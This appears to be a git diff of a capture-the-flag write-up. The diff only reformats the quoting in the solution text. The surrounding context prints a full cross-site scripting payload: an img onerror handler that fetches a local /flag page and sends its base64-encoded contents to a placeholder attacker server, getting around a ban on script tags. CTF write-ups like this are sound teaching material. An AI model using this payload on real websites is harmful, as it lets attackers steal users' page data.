@@ -10,7 +10,7 @@ Lock this challenge behind baked solve.
 
 ## Solution
 
-Similar to baked, we must use Cross-Site Scripting in order to steal the flag. For this challenge, since we cannot use "<script></script>" tags, we can use "<img src=x onerror="PAYLOAD HERE">" instead. We also need to exfiltrate a page, which requires more JavaScript. I make a JavaScript payload and shrunk the payload with a JS Minifier. Below is the payload I used:
+Similar to baked, we must use Cross-Site Scripting in order to steal the flag. For this challenge, since we cannot use `<script></script>` tags, we can use `<img src=x onerror="PAYLOAD HERE">` instead. We also need to exfiltrate a page, which requires more JavaScript. I make a JavaScript payload and shrunk the payload with a JS Minifier. Below is the payload I used:
 
 ```<img src=x onerror="xh=new XMLHttpRequest;xh.onreadystatechange=function(){4==xh.readyState&&fetch('http://<YOUR_SERVER_IP>?'+encodeURI(btoa(xh.responseText)))},xh.open('GET','http://localhost:8000/flag',!0),xh.send();">```
 
